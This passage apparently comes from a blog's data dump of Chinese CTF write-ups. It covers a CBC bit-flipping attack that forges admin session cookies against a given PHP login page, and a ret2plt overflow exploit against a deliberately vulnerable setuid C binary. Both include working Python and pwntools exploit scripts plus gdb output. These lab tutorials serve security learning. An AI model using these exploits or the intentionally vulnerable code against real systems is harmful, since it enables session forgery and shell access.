utf-8 -*-\n# @Date    : 2018-03-15 11:56:20\n# @Author  : csu_vc(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\nimport base64\nimport urllib\ncipher = &#39;t8hxonGnYZs19dVMEzqeZm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&#39;#填写提交后所得的无法反序列化密文\niv = &#39;DbVDXiIkUNkqwCARqqpYew%3D%3D&#39;#一开始提交的iv\ncipher = urllib.unquote(cipher)\ncipher = base64.b64decode(cipher)\niv = base64.b64decode(urllib.unquote(iv))\nnewIv = &#39;&#39;\nright = &#39;a:2:{s:8:&quot;userna&#39;#被损坏前正确的明文\nfor i in range(16):\n    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来\nprint urllib.quote(base64.b64encode(newIv))\n</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"CBC翻转攻击\"><a href=\"#CBC翻转攻击\" class=\"headerlink\" title=\"CBC翻转攻击\"></a>CBC翻转攻击</h1><p>参考链接:</p>\n<ol>\n<li><a href=\"https://blog.csdn.net/csu_vc/article/details/79619309\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/csu_vc/article/details/79619309</a></li>\n<li><a href=\"http://wooyun.jozxing.cc/static/drops/tips-7828.html\" target=\"_blank\" rel=\"noopener\">http://wooyun.jozxing.cc/static/drops/tips-7828.html</a></li>\n</ol>\n<pre><code class=\"php\">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;\n&lt;title&gt;Login Form&lt;/title&gt;\n&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;\n&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n&lt;script type=&quot;text/javascript&quot;&gt;\n$(document).ready(function() {\n    $(&quot;.username&quot;).focus(function() {\n        $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);\n    });\n    $(&quot;.username&quot;).blur(function() {\n        $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);\n    });\n    $(&quot;.password&quot;).focus(function() {\n        $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);\n    });\n    $(&quot;.password&quot;).blur(function() {\n        $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);\n    });\n});\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;?php\ndefine(&quot;SECRET_KEY&quot;, file_get_contents(&#39;/root/key&#39;));\ndefine(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);\nsession_start();\nfunction get_random_iv(){\n    $random_iv=&#39;&#39;;\n    for($i=0;$i&lt;16;$i++){\n        $random_iv.=chr(rand(1,255));\n    }\n    return $random_iv;\n}\nfunction login($info){\n    $iv = get_random_iv();\n    $plain = serialize($info);\n    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);\n    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];\n    setcookie(&quot;iv&quot;, base64_encode($iv));\n    setcookie(&quot;cipher&quot;, base64_encode($cipher));\n}\nfunction check_login(){\n    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){\n        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);\n        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);\n            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];\n        }else{\n            die(&quot;ERROR!&quot;);\n        }\n    }\n}\nfunction show_homepage(){\n    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){\n        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;\n        echo &#39;&lt;p&gt;Flag is $flag&lt;/p&gt;&#39;;\n    }else{\n        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;\n        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;\n    }\n    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;\n}\nif(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])){\n    $username = (string)$_POST[&#39;username&#39;];\n    $password = (string)$_POST[&#39;password&#39;];\n    if($username === &#39;admin&#39;){\n        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#39;);\n    }else{\n        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[&quot;username&quot;])){\n        check_login();\n        show_homepage();\n    }else{\n        echo &#39;&lt;body class=&quot;login-body&quot;&gt;\n                &lt;div id=&quot;wrapper&quot;&gt;\n                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;\n                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;\n                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;\n                        &lt;div class=&quot;header&quot;&gt;\n                        &lt;h1&gt;Login Form&lt;/h1&gt;\n                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;\n                        &lt;/div&gt;\n                        &lt;div class=&quot;content&quot;&gt;\n                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\\&#39;\\&#39;&quot; /&gt;\n                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\\&#39;\\&#39;&quot; /&gt;\n                        &lt;/div&gt;\n                        &lt;div class=&quot;footer&quot;&gt;\n                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;\n                        &lt;/div&gt;\n                    &lt;/form&gt;\n                &lt;/div&gt;\n            &lt;/body&gt;&#39;;\n    }\n}\n?&gt;\n&lt;/html&gt;\n</code></pre>\n<p>首先确定解密后的字符串:</p>\n<blockquote>\n<p>a:2:{s:8:”username”;s:5:”zdmin”;s:8:”password”;s:5:”12345”}</p>\n</blockquote>\n<p>第一步: 替换cookie中的cipher为反转后的cipher.</p>\n<pre><code class=\"python\">#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:45:57\n# @Author  : Mr.zhang(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\n# username=&#39;zdmin&#39;\nimport base64\nimport requests\nimport urllib\niv_raw=&#39;DbVDXiIkUNkqwCARqqpYew%3D%3D&#39;  #这里填写第一次返回的iv值\ncipher_raw=&#39;27cekPxVgR5hbiu6ay%2BUfSmepzwYYL%2FTdbN1K3kmrH2EJ%2FqvBtAdKGGqGytHgJXJzNB26ZRX5dwupd885R%2Bwng%3D%3D&#39;  #这里填写第一次返回的cipher值\nprint &quot;[*]原始iv和cipher&quot;\nprint &quot;iv_raw:  &quot; + iv_raw\nprint &quot;cipher_raw:  &quot; + cipher_raw\nprint &quot;[*]对cipher解码，进行反转&quot;\ncipher = base64.b64decode(urllib.unquote(cipher_raw))\n#a:2:{s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;}\n#s:2:{s:8:&quot;userna\n#me&quot;;s:5:&quot;zdmin&quot;;\n#s:8:&quot;password&quot;;s\n#:3:&quot;12345&quot;;}\nxor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord(&#39;z&#39;) ^ ord(&#39;a&#39;)) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍\nxor_cipher=urllib.quote(base64.b64encode(xor_cipher))\nprint &quot;反转后的cipher：&quot; + xor_cipher\n</code></pre>\n<p>第二步: 第一步执行完，得到一个base64之后的字符串，代入下边的脚本，然后替换cookie中的iv为以下脚本输出的新的iv值。</p>\n<pre><code class=\"python\">#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:56:20\n# @Author  : csu_vc(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\nimport base64\nimport urllib\ncipher = &#39;t8hxonGnYZs19dVMEzqeZm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&#39;#填写提交后所得的无法反序列化密文\niv = &#39;DbVDXiIkUNkqwCARqqpYew%3D%3D&#39;#一开始提交的iv\ncipher = urllib.unquote(cipher)\ncipher = base64.b64decode(cipher)\niv = base64.b64decode(urllib.unquote(iv))\nnewIv = &#39;&#39;\nright = &#39;a:2:{s:8:&quot;userna&#39;#被损坏前正确的明文\nfor i in range(16):\n    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来\nprint urllib.quote(base64.b64encode(newIv))\n</code></pre>\n"},{"title":"bypassaslr_1","date":"2018-05-21T08:30:00.000Z","_content":"\n# 绕过ASLR--return2plt\n\n## 编译代码\n\n1. 源代码\n\n   ```c\n   #include<stdio.h>\n   #include <string.h>\n   /* Eventhough shell() function isnt invoked directly, its needed\n      here since 'system@PLT' and 'exit@PLT' stub code should be pres\n      ent in executable to successfully exploit it. */\n   void shell() {\n   \tsystem(\"/bin/sh\");\n   \texit(0);\n   }\n   int main(int argc, char* argv[]) {\n   \tint i=0;\n   \tchar buf[256];\n   \tread(0, buf, 500);\n   \tprintf(\"%s\\n\",buf);\n   \treturn 0;\n   }\n   ```\n\n2. 编译命令\n\n   ```shell\n   #echo 2 > /proc/sys/kernel/randomize_va_space\n   $gcc -g -fno-stack-protector -no-pie -o vuln vuln.c\n   $sudo chown root vuln\n   $sudo chgrp root vuln\n   $sudo chmod +s vuln\n   ```\n\n<!-- more -->\n\n## 调试代码\n\n```\ngdb-peda$ i func\nAll defined functions:\n\nNon-debugging symbols:\n0x0000000000400470  _init\n0x00000000004004a0  puts@plt\n0x00000000004004b0  system@plt\n0x00000000004004c0  read@plt\n0x00000000004004d0  exit@plt\n0x00000000004004e0  _start\n0x0000000000400510  _dl_relocate_static_pie\n0x0000000000400520  deregister_tm_clones\n0x0000000000400550  register_tm_clones\n0x0000000000400590  __do_global_dtors_aux\n0x00000000004005c0  frame_dummy\n0x00000000004005c7  shell\n0x00000000004005e6  main\n0x0000000000400640  __libc_csu_init\n0x00000000004006b0  __libc_csu_fini\n0x00000000004006b4  _fini\n```\n\n首先，我们找到shell函数的地址`0x00000000004005c7`\n\n再找到ret地址的偏移:\n\n```\ngdb-peda$ pattern_create 300\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln \nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x0 \nRBX: 0x0 \nRCX: 0x7ffff7af4154 (<__GI___libc_write+20>:\tcmp    rax,0xfffffffffffff000)\nRDX: 0x7ffff7dd18c0 --> 0x0 \nRSI: 0x602260 --> 0x4173414125410a7f \nRDI: 0x1 \nRBP: 0x3425416525414925 ('%IA%eA%4')\nRSP: 0x7fffffffdd98 (\"A%JA%fA%5A%KA%gA%6A%\\n\\177\")\nRIP: 0x400638 (<main+82>:\tret)\nR8 : 0x0 \nR9 : 0x0 \nR10: 0x602010 --> 0x0 \nR11: 0x246 \nR12: 0x4004e0 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffde70 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x40062d <main+71>:\tcall   0x4004a0 <puts@plt>\n   0x400632 <main+76>:\tmov    eax,0x0\n   0x400637 <main+81>:\tleave  \n=> 0x400638 <main+82>:\tret    \n   0x400639:\tnop    DWORD PTR [rax+0x0]\n   0x400640 <__libc_csu_init>:\tpush   r15\n   0x400642 <__libc_csu_init+2>:\tpush   r14\n   0x400644 <__libc_csu_init+4>:\tmov    r15,rdx\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd98 (\"A%JA%fA%5A%KA%gA%6A%\\n\\177\")\n0008| 0x7fffffffdda0 (\"5A%KA%gA%6A%\\n\\177\")\n0016| 0x7fffffffdda8 --> 0x7f0a25413625 \n0024| 0x7fffffffddb0 --> 0x100008000 \n0032| 0x7fffffffddb8 --> 0x4005e6 (<main>:\tpush   rbp)\n0040| 0x7fffffffddc0 --> 0x0 \n0048| 0x7fffffffddc8 --> 0xd10c02d6c0ba1de5 \n0056| 0x7fffffffddd0 --> 0x4004e0 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0000000000400638 in main ()\ngdb-peda$ pattern_offset A%JA%fA%5A%KA%gA%6A%\\n\\177\nA%JA%fA%5A%KA%gA%6A% found at offset: 280\n```\n\n现在构造payload如下:\n\n> 'A' * 280 + shell_addr\n\n测试一下:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ python -c \"print 'A' * 280 + '\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'\" > temp\n```\n\n我们发现，并没有给我们shell。\n\n```\ntianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...(no debugging symbols found)...done.\ngdb-peda$ r < temp\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln < temp\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@\n[New process 87894]\n\nThread 2.1 \"vuln\" received signal SIGSEGV, Segmentation fault.\n[Switching to process 87894]\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')\nRBX: 0x0 \nRCX: 0x7ffff7b97e9f --> 0x2074697865006873 ('sh')\nRDX: 0x0 \nRSI: 0x7ffff7dd16a0 --> 0x0 \nRDI: 0x2 \nRBP: 0x7fffffffdc58 --> 0x0 \nRSP: 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 \nRIP: 0x7ffff7a332f6 (<do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0)\nR8 : 0x7ffff7dd1600 --> 0x0 \nR9 : 0x0 \nR10: 0x8 \nR11: 0x246 \nR12: 0x4006c4 --> 0x68732f6e69622f ('/bin/sh')\nR13: 0x7fffffffde70 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff7a332e6 <do_system+1078>:\tmovq   xmm0,QWORD PTR [rsp+0x8]\n   0x7ffff7a332ec <do_system+1084>:\tmov    QWORD PTR [rsp+0x8],rax\n   0x7ffff7a332f1 <do_system+1089>:\tmovhps xmm0,QWORD PTR [rsp+0x8]\n=> 0x7ffff7a332f6 <do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0\n   0x7ffff7a332fb <do_system+1099>:\tcall   0x7ffff7a23110 <__GI___sigaction>\n   0x7ffff7a33300 <do_system+1104>:\tlea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 <quit>\n   0x7ffff7a33307 <do_system+1111>:\txor    edx,edx\n   0x7ffff7a33309 <do_system+1113>:\tmov    edi,0x3\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 \n0008| 0x7fffffffdc00 --> 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')\n0016| 0x7fffffffdc08 --> 0x0 \n0024| 0x7fffffffdc10 --> 0x0 \n0032| 0x7fffffffdc18 --> 0x7ffff7a33360 (<cancel_handler>:\tpush   rbx)\n0040| 0x7fffffffdc20 --> 0x7fffffffdc14 --> 0xf7a3336000000000 \n0048| 0x7fffffffdc28 --> 0x0 \n0056| 0x7fffffffdc30 --> 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00007ffff7a332f6 in do_system (line=0x4006c4 \"/bin/sh\") at ../sysdeps/posix/system.c:125\n125\t../sysdeps/posix/system.c: No such file or directory.\n```\n\n卡在这个地方:\n\n```\n0x7ffff7a332f6 <do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0\n```\n\n这是因为movaps需要我们的rsp地址对齐到16字节。\n\n当前rsp的值:\n\n```\nRSP: 0x7fffffffdbf8\n```\n\n知道原因后，我们可以重新构造如下payload:\n\n> 'A' * 280 + ret_addr + shell_addr\n\n脚本如下:\n\n```python\nfrom pwn import *\n\n# 'A' * 280 + ret_addr + shell_addr\npayload = 'A' * 280 + '\\x38\\x06\\x40\\x00\\x00\\x00\\x00\\x00' + '\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'\n\nio = process(\"./vuln\")\nio.sendline(payload)\nio.interactive()\n```\n\n\n\n","source":"_posts/bypassaslr-1.md","raw":"---\ntitle: bypassaslr_1\ndate: 2018-05-21 16:30:00\ntags: pwn\n---\n\n# 绕过ASLR--return2plt\n\n## 编译代码\n\n1. 源代码\n\n   ```c\n   #include<stdio.h>\n   #include <string.h>\n   /* Eventhough shell() function isnt invoked directly, its needed\n      here since 'system@PLT' and 'exit@PLT' stub code should be pres\n      ent in executable to successfully exploit it. */\n   void shell() {\n   \tsystem(\"/bin/sh\");\n   \texit(0);\n   }\n   int main(int argc, char* argv[]) {\n   \tint i=0;\n   \tchar buf[256];\n   \tread(0, buf, 500);\n   \tprintf(\"%s\\n\",buf);\n   \treturn 0;\n   }\n   ```\n\n2. 编译命令\n\n   ```shell\n   #echo 2 > /proc/sys/kernel/randomize_va_space\n   $gcc -g -fno-stack-protector -no-pie -o vuln vuln.c\n   $sudo chown root vuln\n   $sudo chgrp root vuln\n   $sudo chmod +s vuln\n   ```\n\n<!-- more -->\n\n## 调试代码\n\n```\ngdb-peda$ i func\nAll defined functions:\n\nNon-debugging symbols:\n0x0000000000400470  _init\n0x00000000004004a0  puts@plt\n0x00000000004004b0  system@plt\n0x00000000004004c0  read@plt\n0x00000000004004d0  exit@plt\n0x00000000004004e0  _start\n0x0000000000400510  _dl_relocate_static_pie\n0x0000000000400520  deregister_tm_clones\n0x0000000000400550  register_tm_clones\n0x0000000000400590  __do_global_dtors_aux\n0x00000000004005c0  frame_dummy\n0x00000000004005c7  shell\n0x00000000004005e6  main\n0x0000000000400640  __libc_csu_init\n0x00000000004006b0  __libc_csu_fini\n0x00000000004006b4  _fini\n```\n\n首先，我们找到shell函数的地址`0x00000000004005c7`\n\n再找到ret地址的偏移:\n\n```\ngdb-peda$ pattern_create 300\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln \nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x0 \nRBX: 0x0 \nRCX: 0x7ffff7af4154 (<__GI___libc_write+20>:\tcmp    rax,0xfffffffffffff000)\nRDX: 0x7ffff7dd18c0 --> 0x0 \nRSI: 0x602260 --> 0x4173414125410a7f \nRDI: 0x1 \nRBP: 0x3425416525414925 ('%IA%eA%4')\nRSP: 0x7fffffffdd98 (\"A%JA%fA%5A%KA%gA%6A%\\n\\177\")\nRIP: 0x400638 (<main+82>:\tret)\nR8 : 0x0 \nR9 : 0x0 \nR10: 0x602010 --> 0x0 \nR11: 0x246 \nR12: 0x4004e0 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffde70 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x40062d <main+71>:\tcall   0x4004a0 <puts@plt>\n   0x400632 <main+76>:\tmov    eax,0x0\n   0x400637 <main+81>:\tleave  \n=> 0x400638 <main+82>:\tret    \n   0x400639:\tnop    DWORD PTR [rax+0x0]\n   0x400640 <__libc_csu_init>:\tpush   r15\n   0x400642 <__libc_csu_init+2>:\tpush   r14\n   0x400644 <__libc_csu_init+4>:\tmov    r15,rdx\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd98 (\"A%JA%fA%5A%KA%gA%6A%\\n\\177\")\n0008| 0x7fffffffdda0 (\"5A%KA%gA%6A%\\n\\177\")\n0016| 0x7fffffffdda8 --> 0x7f0a25413625 \n0024| 0x7fffffffddb0 --> 0x100008000 \n0032| 0x7fffffffddb8 --> 0x4005e6 (<main>:\tpush   rbp)\n0040| 0x7fffffffddc0 --> 0x0 \n0048| 0x7fffffffddc8 --> 0xd10c02d6c0ba1de5 \n0056| 0x7fffffffddd0 --> 0x4004e0 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0000000000400638 in main ()\ngdb-peda$ pattern_offset A%JA%fA%5A%KA%gA%6A%\\n\\177\nA%JA%fA%5A%KA%gA%6A% found at offset: 280\n```\n\n现在构造payload如下:\n\n> 'A' * 280 + shell_addr\n\n测试一下:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ python -c \"print 'A' * 280 + '\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'\" > temp\n```\n\n我们发现，并没有给我们shell。\n\n```\ntianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...(no debugging symbols found)...done.\ngdb-peda$ r < temp\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln < temp\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@\n[New process 87894]\n\nThread 2.1 \"vuln\" received signal SIGSEGV, Segmentation fault.\n[Switching to process 87894]\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')\nRBX: 0x0 \nRCX: 0x7ffff7b97e9f --> 0x2074697865006873 ('sh')\nRDX: 0x0 \nRSI: 0x7ffff7dd16a0 --> 0x0 \nRDI: 0x2 \nRBP: 0x7fffffffdc58 --> 0x0 \nRSP: 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 \nRIP: 0x7ffff7a332f6 (<do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0)\nR8 : 0x7ffff7dd1600 --> 0x0 \nR9 : 0x0 \nR10: 0x8 \nR11: 0x246 \nR12: 0x4006c4 --> 0x68732f6e69622f ('/bin/sh')\nR13: 0x7fffffffde70 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff7a332e6 <do_system+1078>:\tmovq   xmm0,QWORD PTR [rsp+0x8]\n   0x7ffff7a332ec <do_system+1084>:\tmov    QWORD PTR [rsp+0x8],rax\n   0x7ffff7a332f1 <do_system+1089>:\tmovhps xmm0,QWORD PTR [rsp+0x8]\n=> 0x7ffff7a332f6 <do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0\n   0x7ffff7a332fb <do_system+1099>:\tcall   0x7ffff7a23110 <__GI___sigaction>\n   0x7ffff7a33300 <do_system+1104>:\tlea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 <quit>\n   0x7ffff7a33307 <do_system+1111>:\txor    edx,edx\n   0x7ffff7a33309 <do_system+1113>:\tmov    edi,0x3\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 \n0008| 0x7fffffffdc00 --> 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')\n0016| 0x7fffffffdc08 --> 0x0 \n0024| 0x7fffffffdc10 --> 0x0 \n0032| 0x7fffffffdc18 --> 0x7ffff7a33360 (<cancel_handler>:\tpush   rbx)\n0040| 0x7fffffffdc20 --> 0x7fffffffdc14 --> 0xf7a3336000000000 \n0048| 0x7fffffffdc28 --> 0x0 \n0056| 0x7fffffffdc30 --> 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00007ffff7a332f6 in do_system (line=0x4006c4 \"/bin/sh\") at ../sysdeps/posix/system.c:125\n125\t../sysdeps/posix/system.c: No such file or 